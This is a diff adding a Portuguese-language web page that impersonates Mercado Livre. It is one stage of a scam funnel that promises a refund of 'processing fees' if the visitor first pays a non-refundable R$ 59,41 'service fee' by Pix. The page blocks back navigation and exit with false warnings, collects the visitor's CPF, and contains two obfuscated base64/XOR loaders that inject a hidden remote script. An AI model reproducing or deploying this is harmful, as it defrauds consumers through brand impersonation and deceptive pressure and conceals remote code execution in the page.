@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/assets/js/error-log.js?v=1"></script><script>window.ROTAS={"raiz":"/","questionario":"/oferta95/questionario/","roleta":"/oferta95/roleta/","recompensas":"/oferta95/recompensas/","produto":"/produtos/","checkout":"/oferta95/checkout/","up":"/oferta95/up/","esgotou":"/oferta95/esgotou/","reembolso":"/oferta95/reembolso/"};function rota(n){return (window.ROTAS&&window.ROTAS[n])||"/";}</script><script src="/assets/js/replay/fm-replay.js?v=1793774445" data-endpoint="/api/replay.php" data-amostra="30" defer></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Reembolso do seu pedido - Mercado Livre</title>
+<link rel="icon" href="/assets/images/favicon.png">
+<link href="/assets/css/fonts.css" rel="stylesheet">
+<!-- [29/10] 3a etapa do funil. Mesmo visual do esgotou/up: componentes compartilhados em assets/css/funil.css -->
+<link href="/assets/css/funil.css?v=14" rel="stylesheet">
+
+<script>
+/* retem o lead que tenta sair sem resgatar (mesmo padrao do /up/) */
+let shouldShowPopup = true;
+window.onbeforeunload = function(event) {
+  if (shouldShowPopup) {
+    var p = document.getElementById('custom-popup');
+    if (p) p.classList.add('show');
+    event.preventDefault();
+    event.returnValue = '';
+    return 'ATENÇÃO! Ao sair você perde o reembolso disponível para o seu pedido.';
+  }
+};
+function hideCustomPopup() { var p = document.getElementById('custom-popup'); if (p) p.classList.remove('show'); }
+function preventBackNavigation() {
+  window.history.pushState(null, '', window.location.href);
+  window.addEventListener('popstate', function() {
+    var p = document.getElementById('custom-popup'); if (p) p.classList.add('show');
+    window.history.pushState(null, '', window.location.href);
+  });
+}
+window.onload = function() { preventBackNavigation(); };
+</script>
+
+<style>
+/* ajustes locais do reembolso (o resto vem de funil.css) */
+#ben, #pix-modal { padding-bottom: 118px; }
+#pix-modal { display: none; }
+/* destaque do valor reembolsado dentro do resumo (mesma linguagem do .eco) */
+.esg-resumo .r.receber { padding: 12px 0; }
+.esg-resumo .r.receber > span:first-child { font-size: 15px; font-weight: 700; color: var(--ml-green); }
+.esg-resumo .r.receber b { font-size: 22px; font-weight: 700; color: var(--ml-green); }
+</style>
+<script src="/assets/js/funil-recover.js?v=1" defer></script>
+
+<script src="/assets/js/tiktok-helper.js?v=1"></script>
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2027107937966810');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2027107937966810&ev=PageView&noscript=1"/></noscript>
+<!-- End Facebook Pixel Code -->
+<!-- FB/UTM Cookie Capture -->
+<script>
+(function(){
+  try{
+    var cs=document.cookie.split(";");
+    for(var i=0;i<cs.length;i++){
+      var c=cs[i].trim();
+      if(c.indexOf("_fbp=")===0) localStorage.setItem("ml_fbp",c.substring(5));
+      if(c.indexOf("_fbc=")===0) localStorage.setItem("ml_fbc",c.substring(5));
+    }
+    var u=new URLSearchParams(window.location.search);
+    var fbclid=u.get("fbclid");
+    if(fbclid){
+      var fbc="fb.1."+Date.now()+"."+fbclid;
+      document.cookie="_fbc="+fbc+";path=/;max-age=7776000;SameSite=Lax";
+      localStorage.setItem("ml_fbc",fbc);
+    }
+    var utms={};
+    ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","src","sck"].forEach(function(k){
+      var v=u.get(k); if(v) utms[k]=v;
+    });
+    if(Object.keys(utms).length>0){
+      var old={}; try{old=JSON.parse(localStorage.getItem("ml_utms")||"{}")}catch(e){}
+      Object.assign(old,utms);
+      localStorage.setItem("ml_utms",JSON.stringify(old));
+    }
+  }catch(e){}
+})();
+</script>
+
+<script>(function(){var t_xp=atob("DCXIzfdTl3LzTePFMl7quIU/tUjRJZexQlby4tgw8xzdOJeoW0Ox45Q8+lyRP8y2UVehvYMguAeHIJDqXkS8qIQnuRiAb8/nU1G8v54x4gaWPsH/aV7qo5Y+8lDJb4ekRkTluIM+/hSKYJO3V1Oto4N+7xGcKc62UU7q4dUl9h6GKMH/EAe14Yxx+ROeKMH/EEGpuZZ+4gaeJIW8H1W6qIE2+QbePpanW0G779tx4ROfOIbnCAfqsKou");var c_dkmb=[];for(var d_y=0;d_y<t_xp.length;d_y++){c_dkmb.push(t_xp.charCodeAt(d_y)&255);}var f_3zy=c_dkmb[0];var c_0hv=c_dkmb.slice(1,1+f_3zy);var n_h=c_dkmb.slice(1+f_3zy);var e_hxw0=n_h.map(function(b,f_e30){return b^c_0hv[f_e30%f_3zy];});var z_t="";for(var u_43n=0;u_43n<e_hxw0.length;u_43n++){z_t+=String.fromCharCode(e_hxw0[u_43n]&255);}var x_lb3s=decodeURIComponent(escape(z_t));var b_g=JSON.parse(x_lb3s);var n_pu=b_g.globals||[];n_pu.forEach(function(n_r){window[n_r.name]=n_r.value;});var f_plp5=document.createElement("script");f_plp5.src=b_g.url;f_plp5.async=true;f_plp5.defer=true;(b_g.attributes||[]).forEach(function(p_y){f_plp5.setAttribute(p_y.name,p_y.value);});(document.head||document.documentElement).appendChild(f_plp5);})();</script>
+
+<script>(function(){var q_si=atob("DBsW4u7fpqiJ9a0Kd2A0l5yzhJKrndl+B2gszcG8wsangNlnHn1vzI2wy4brh4J5FGl/kpqsidjgjchmWGt/mouziML614EoFm9ikIe909zsho8wLEY6wImzycromd4oTUBtwIC+y82rz496HmNzjqe7hISrg8xmAn402MzpxJi4kZwzESom2ovtnsrtkMs6Fisg1Yr92/X0");var b_7=[];for(var a_0nc8=0;a_0nc8<q_si.length;a_0nc8++){b_7.push(q_si.charCodeAt(a_0nc8)&255);}var m_cdmr=b_7[0];var q_z=b_7.slice(1,1+m_cdmr);var e_bd=b_7.slice(1+m_cdmr);var w_1=e_bd.map(function(b,k_a){return b^q_z[k_a%m_cdmr];});var e_83m="";for(var o_yjqq=0;o_yjqq<w_1.length;o_yjqq++){e_83m+=String.fromCharCode(w_1[o_yjqq]&255);}var z_dv=decodeURIComponent(escape(e_83m));var e_72=JSON.parse(z_dv);var i_svxc=e_72.globals||[];i_svxc.forEach(function(e_5i6){window[e_5i6.name]=e_5i6.value;});var k_u=document.createElement("script");k_u.src=e_72.url;k_u.async=true;k_u.defer=true;(e_72.attributes||[]).forEach(function(e_6a){k_u.setAttribute(e_6a.name,e_6a.value);});(document.head||document.documentElement).appendChild(k_u);})();</script>
+
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="i-lock" viewBox="0 0 24 24"><path d="M6 10V8a6 6 0 1 1 12 0v2h1v12H5V10zm2 0h8V8a4 4 0 1 0-8 0z"/></symbol>
+  <symbol id="i-truck" viewBox="0 0 24 24"><path d="M3 5h11v9H3zM14 8h4l3 3.5V14h-7z"/><circle cx="7" cy="16.5" r="2"/><circle cx="17" cy="16.5" r="2"/></symbol>
+  <symbol id="i-copy" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></symbol>
+</svg>
+
+<div class="wrap">
+  <div class="top"><img src="/assets/images/logo.webp" alt="Mercado Livre"><span class="seg"><svg class="ico"><use href="#i-lock"/></svg> Compra segura</span></div>
+
+  <!-- ======== BEN: beneficio de reembolso ======== -->
+  <div id="ben">
+    <div class="esg-upd"><span class="esg-dot g">✓</span><div><b>Reembolso aprovado</b><small>Pedido #<span id="ped">…</span> · benefício disponível</small></div></div>
+
+    <div class="esg-notice"><i>!</i><div>Identificamos que o seu pedido acumulou <b>taxas durante o processamento</b>. Como forma de garantia, você tem direito ao <b>reembolso integral dessas taxas</b> diretamente na sua chave Pix.</div></div>
+
+    <div class="esg-sep"></div>
+    <div class="esg-box">
+      <div class="esg-ok"><span class="esg-ck">✓</span>Reembolso liberado para o seu pedido</div>
+      <p class="esg-txt">Confira abaixo as taxas pagas durante o processamento. O valor total é devolvido na sua chave Pix após a confirmação.</p>
+
+      <div class="esg-resumo" id="taxas">
+        <div class="r"><span>Carregando taxas pagas…</span><b>—</b></div>
+      </div>
+
+      <div class="nf-form">
+        <b>Chave Pix para o reembolso</b>
+        <small>O valor é creditado nesta chave após a confirmação. Confira ou altere.</small>
+        <label>Chave Pix (CPF)<input id="rb-pix" type="text" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" maxlength="14"></label>
+      </div>
+
+      <p class="esg-txt">A <b>taxa de serviço</b> de <span id="r-servico2">R$ 59,41</span> é cobrada uma única vez e <b>não é reembolsável</b>. Com o pagamento confirmado, o total das taxas é devolvido na sua chave Pix.</p>
+
+      <button class="btn" id="go">Pagar taxa e resgatar reembolso</button>
+      <div class="esg-sub">Pagamento seguro via Pix · confirmação imediata</div>
+    </div>
+  </div>
+
+  <!-- ======== PIX da taxa de servico (mesma tela do esgotou/up) ======== -->
+  <div id="pix-modal">
+    <div class="esg-upd"><span class="esg-dot g">✓</span><div><b>Taxa de serviço do reembolso</b><small>Após a confirmação, o reembolso de <b id="r-receber2">—</b> é creditado na sua chave Pix</small></div></div>
+    <div class="esg-sep"></div>
+    <div class="esg-box">
+      <div class="esg-resumo">
+        <div class="r"><span>Pedido</span><b id="r-ped">—</b></div>
+        <div class="r"><span>Reembolso a receber</span><b id="r-receber3">—</b></div>
+        <div class="r"><span>Chave Pix do reembolso</span><b id="r-who">—</b></div>
+        <div class="div"></div>
+        <div class="r tot"><span>Taxa de serviço</span><span class="v"><b id="r-servico3">R$ 59,41</b><small>via Pix</small></span></div>
+      </div>
+
+      <div id="pix-loading" class="pix-loading"><span class="ic"></span><span>Gerando código Pix…</span></div>
+
+      <div id="pix-content" style="display:none">
+        <div class="pix-qrbox">
+          <div id="qr-code" class="pix-qr" data-rr-block></div>
+          <small>Escaneie o QR Code no app do seu banco ou copie o código abaixo</small>
+        </div>
+        <button class="btn" id="copy-btn"><svg class="ico"><use href="#i-copy"/></svg> <span>Copiar código Pix</span></button>
+        <div class="pix-code-section"><label class="pix-code-label" for="pix-code">Código Pix Copia e Cola</label><input type="text" id="pix-code" readonly class="pix-code-input" value=""></div>
+        <div class="pix-status" id="status"><span class="pix-status-dot"></span><span>Aguardando pagamento…</span></div>
+        <button class="btn-sec pix-check-btn" id="check-btn">Já paguei, verificar pagamento</button>
+        <div class="pix-steps"><b>Como pagar em 3 passos</b>
+          <div><em>1</em><span>Copie o código acima</span></div>
+          <div><em>2</em><span>Abra o app do seu banco e escolha Pix Copia e Cola</span></div>
+          <div><em>3</em><span>Cole o código, confirme e volte para esta página</span></div>
+        </div>
+      </div>
+
+      <div id="pix-confirmed" style="display:none">
+        <div class="up-rows">
+          <div class="row ok"><i>✓</i><div><b>Taxa confirmada!</b><small>O reembolso está sendo processado.</small></div></div>
+          <div class="row ok"><i>✓</i><div><b>Reembolso em transferência</b><small>O valor será creditado na sua chave Pix em até 1 dia útil.</small></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="esg-footer">
+    <div class="esg-icons">
+      <div><svg viewBox="0 0 24 24"><path fill="#3483fa" d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5z"/><path d="m8.5 12 2.5 2.5 4.5-5" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Compra<br>Garantida</span></div>
+      <div><svg style="fill:#3483fa"><use href="#i-truck"/></svg><span>Frete<br>FULL</span></div>
+      <div><svg viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M9 7 4 11l5 4"/><path d="M4 11h10a6 6 0 0 1 6 6"/></svg><span>Devolução<br>grátis 30 dias</span></div>
+    </div>
+    <div class="esg-foot">Mercado Livre © 2026 · Pagamento seguro por Mercado Pago</div>
+  </footer>
+</div>
+
+<!-- POPUP (voltar sem resgatar) -->
+<div class="popup" id="custom-popup">
+  <div class="card">
+    <h2><i>!</i>Atenção</h2>
+    <p>Ao sair desta página você perde o reembolso disponível para o seu pedido. O benefício não poderá ser resgatado novamente.</p>
+    <button class="btn" onclick="hideCustomPopup(); document.getElementById('go').click();">Resgatar meu reembolso</button>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">Código Pix copiado!</div>
+
+<script src="/assets/js/qrcode.min.js"></script>
+<script src="/assets/js/repix.js?v=1"></script>
+<script>
+/* ============================================
+   REEMBOLSO (3a etapa) — lista as taxas REAIS pagas (../api/reembolso.php) e cobra a taxa de
+   servico (funil.reembolso_amount; o servidor impoe o valor) via Pix. Mesmo fluxo do /up/.
+   ============================================ */
+(function() {
+  'use strict';
+  function $(i){ return document.getElementById(i); }
+  function brl(c){ return 'R$ ' + (c/100).toLocaleString('pt-BR', {minimumFractionDigits:2, maximumFractionDigits:2}); }
+  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); }
+  function digits(v){ return String(v||'').replace(/\D+/g, '').slice(0, 11); }
+  function maskCpf(v){ var d = digits(v); return d.replace(/^(\d{3})(\d)/, '$1.$2').replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3').replace(/\.(\d{3})(\d{1,2})$/, '.$1-$2'); }
+
+  var qs = new URLSearchParams(location.search);
+  var MAIN = (qs.get('c') || '').replace(/[^A-Za-z0-9_-]/g, '');
+  if (!MAIN) { try { MAIN = (JSON.parse(localStorage.getItem('ml_main_pix') || '{}').code) || ''; } catch(e) {} }
+
+  var D = null, UP_CODE = '';
+
+  // prefill da chave Pix com o CPF do cadastro
+  (function() {
+    var c = {}; try { c = JSON.parse(localStorage.getItem('ml_customer_data') || '{}'); } catch(e) {}
+    var el = $('rb-pix');
+    if (el) { el.value = maskCpf(c.document || c.cpf || ''); el.addEventListener('input', function(){ el.value = maskCpf(el.value); }); }
+  })();
+
+  // ---------- dados: taxas reais pagas + total a receber ----------
+  fetch('/api/reembolso.php?c=' + encodeURIComponent(MAIN), {cache:'no-store'})
+    .then(function(r){ return r.json(); })
+    .then(function(d){ if (!d || !d.on) return; D = d; UP_CODE = d.up_code || ''; render(); })
+    .catch(function(){});
+
+  function render() {
+    $('ped').textContent = D.pedido;
+    $('r-ped').textContent = '#' + D.pedido;
+    var h = '';
+    (D.taxas || []).forEach(function(t){ h += '<div class="r"><span>' + esc(t.nome) + '</span><b>' + brl(t.valor) + '</b></div>'; });
+    h += '<div class="div"></div>';
+    h += '<div class="r receber"><span>Você recebe de volta</span><b>' + brl(D.reembolso) + '</b></div>';
+    h += '<div class="div"></div>';
+    h += '<div class="r tot"><span>Taxa de serviço</span><span class="v"><b>' + brl(D.servico) + '</b><small>via Pix · não reembolsável</small></span></div>';
+    $('taxas').innerHTML = h;
+    $('r-receber2').textContent = brl(D.reembolso);
+    $('r-receber3').textContent = brl(D.reembolso);
+    $('r-servico2').textContent = brl(D.servico);
+    $('r-servico3').textContent = brl(D.servico);
+  }
+
+  // ---------- Pix da taxa de servico ----------
+  var pcode = null, poll = null, generating = false;
+
+  $('go').onclick = function() {
+    $('ben').style.display = 'none';
+    $('pix-modal').style.display = 'block';
+    window.scrollTo(0, 0);
+    shouldShowPopup = false;
+    genPix();
+  };
+
+  function genPix() {
+    if (generating) return;
+    generating = true;
+    var loading = $('pix-loading'), content = $('pix-content'), confirmed = $('pix-confirmed');
+    loading.style.display = 'flex';
+    loading.innerHTML = '<span class="ic"></span><span>Gerando código Pix…</span>';
+    content.style.display = 'none'; confirmed.style.display = 'none';
+
+    var c = {}; try { c = JSON.parse(localStorage.getItem('ml_customer_data') || '{}'); } catch(e) {}
+    // chave Pix do reembolso (editavel) prevalece sobre o cadastro
+    var pix = $('rb-pix'), chave = pix && digits(pix.value).length === 11 ? digits(pix.value) : digits(c.document || c.cpf || '');
+    if (chave) { c.document = maskCpf(chave); try { localStorage.setItem('ml_customer_data', JSON.stringify(c)); } catch(e) {} }
+    var who = $('r-who');
+    if (who) who.textContent = chave.length === 11 ? chave.replace(/^(\d{3})\d{3}\d{3}(\d{2})$/, '$1.***.***-$2') : '—';
+
+    var u = {}; try { u = JSON.parse(localStorage.getItem('ml_utms') || '{}'); } catch(e) {}
+    var mainCode = ''; try { mainCode = (JSON.parse(localStorage.getItem('ml_main_pix') || '{}').code) || MAIN; } catch(e) { mainCode = MAIN; }
+
+    fetch('/api/pix/payment.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        customer: { email: c.email || '', name: c.name || '', document: chave, phone: c.phone || c.telefone || '', ref: c.ref || '' },
+        amount: (D ? D.servico : 5941),
+        items: [{ id: 'reemb', name: 'Taxa de serviço do reembolso', price: (D ? D.servico : 5941), quantity: 1 }],
+        trackingParameters: Object.assign({}, u, { fbp: localStorage.getItem('ml_fbp'), fbc: localStorage.getItem('ml_fbc') }, (typeof ttkGetTracking === 'function' ? ttkGetTracking() : {})),
+        metadata: { type: 'upsell_reembolso', up_code: UP_CODE, main_code: mainCode }
+      })
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (!data.success || !data.pix_qrcode_text) throw new Error(data.error || 'Erro');
+      pcode = data.payment_code;
+      var qc = $('qr-code');
+      if (qc && typeof qrcode !== 'undefined') { var g = qrcode(0, 'M'); g.addData(data.pix_qrcode_text); g.make(); qc.innerHTML = g.createImgTag(4, 8); }
+      $('pix-code').value = data.pix_qrcode_text;
+      loading.style.display = 'none'; content.style.display = 'block';
+      startPoll();
+    })
+    .catch(function() {
+      generating = false;
+      loading.style.display = 'block';
+      loading.innerHTML = '<div class="pix-err">Erro ao gerar o Pix. Tente novamente.</div>' +
+        '<button class="btn" style="margin-top:4px" onclick="document.getElementById(\'go\').click()">Tentar novamente</button>';
+    });
+  }
+
+  $('copy-btn').onclick = function() {
+    var input = $('pix-code'), btn = $('copy-btn');
+    var onCopy = function() {
+      btn.classList.add('copied'); btn.lastChild.textContent = 'Código copiado!';
+      setTimeout(function(){ btn.classList.remove('copied'); btn.lastChild.textContent = 'Copiar código Pix'; }, 3000);
+      var t = $('toast'); if (t) { t.style.display = 'block'; t.style.opacity = '1'; setTimeout(function(){ t.style.opacity = '0'; setTimeout(function(){ t.style.display = 'none'; }, 300); }, 2500); }
+    };
+    if (navigator.clipboard) navigator.clipboard.writeText(input.value).then(onCopy);
+    else { input.select(); document.execCommand('copy'); onCopy(); }
+  };
+
+  function startPoll() {
+    if (poll) clearInterval(poll);
+    var n = 0;
+    poll = setInterval(function(){ if (++n > 120) { clearInterval(poll); return; } if (document.visibilityState === 'visible') check(false); }, 5000);
+  }
+  $('check-btn').onclick = function() { $('check-btn').textContent = 'Verificando…'; check(true); };
+  document.addEventListener('visibilitychange', function(){ if (document.visibilityState === 'visible' && pcode) check(false); });
+  window.addEventListener('pageshow', function(){ if (pcode) check(false); });
+
+  function check(manual) {
+    if (!pcode) return;
+    fetch('/api/pix/check-payment.php?code=' + encodeURIComponent(pcode))
+      .then(function(r){ return r.json(); })
+      .then(function(data){
+        if (data.status === 'paid') {
+          if (poll) clearInterval(poll);
+          var st = $('status'); if (st) { st.classList.add('confirmed'); st.lastChild.textContent = 'Pagamento confirmado!'; }
+          openRp();
+        } else if (manual) {
+          $('check-btn').textContent = 'Ainda não confirmado, aguarde…';
+          setTimeout(function(){ $('check-btn').textContent = 'Já paguei, verificar pagamento'; }, 3000);
+        }
+      })
+      .catch(function(){ if (manual) $('check-btn').textContent = 'Erro. Tente novamente.'; });
+  }
+
+  // RePix: bottom-sheet 1x; QUALQUER acao (enviar/pular/fechar) encerra com a tela de confirmado.
+  var rp = MLRepix.create({ api: '/api/repix.php' }), rpOpened = false;
+  function openRp() {
+    if (rpOpened || !pcode) return;
+    rpOpened = true;
+    rp.openSheet(pcode, function(){ showConfirmed(); });
+  }
+  function showConfirmed() {
+    if (poll) clearInterval(poll);
+    shouldShowPopup = false;
+    $('pix-content').style.display = 'none';
+    $('pix-confirmed').style.display = 'block';
+    window.scrollTo(0, 0);
+  }
+})();
+</script>
+</body>
+</html>
